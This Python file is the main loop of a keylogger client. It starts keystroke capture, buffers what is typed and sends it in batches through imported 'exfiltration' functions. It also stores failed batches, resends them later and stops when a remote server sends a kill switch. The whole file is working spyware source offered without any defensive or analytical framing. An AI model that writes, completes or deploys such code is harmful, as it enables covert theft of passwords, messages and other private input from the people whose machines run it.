from buffer_management import BufferManager
from exfiltration import send_batch, resend_stored_batches
from key_capture import KeyLogger
import time

MAX_GLOBAL_RETRIES = 1  # terminate after this many failed batch attempts


def main():
    buffer = BufferManager(max_size=10, flush_interval=10)
    logger = KeyLogger(buffer)
    logger.start()

    global_retry_count = 0
    running = True

    try:
        while running:

            # -------------------------------------------------
            # STEP 1: Retry previously stored encrypted batches
            # -------------------------------------------------
            retry_result = resend_stored_batches()
            if retry_result == "STOP":
                print("[!] Kill switch received during retry. Exiting.")
                break

            # -------------------------------------------------
            # STEP 2: Check if buffer should flush
            # -------------------------------------------------
            if buffer.should_flush():

                batch = buffer.flush()

                # Defensive check
                if batch and batch.get("data"):

                    result = send_batch(batch)

                    if result == "STOP":
                        print("[!] Kill switch received. Exiting.")
                        running = False

                    elif result is False:
                        global_retry_count += 1
                        print(f"[!] Server unreachable. Global retry count: {global_retry_count}")

                        if global_retry_count >= MAX_GLOBAL_RETRIES:
                            print("[!] Maximum unsuccessful attempts reached. Exiting client.")
                            running = False

                    else:
                        # Successful delivery
                        global_retry_count = 0

                else:
                    print("[*] No keystrokes captured yet. Waiting...")

            time.sleep(1)

    except KeyboardInterrupt:
        print("[!] Manual interruption detected.")

    finally:
        print("[*] Shutting down keylogger...")
        logger.stop()

        # -------------------------------------------------
        # Final flush before exit (if allowed)
        # -------------------------------------------------
        if global_retry_count < MAX_GLOBAL_RETRIES:
            batch = buffer.flush()
            if batch and batch.get("data"):
                print("[*] Sending final batch before exit...")
                send_batch(batch)

        print("[+] Client shutdown complete.")


if __name__ == "__main__":
    main()
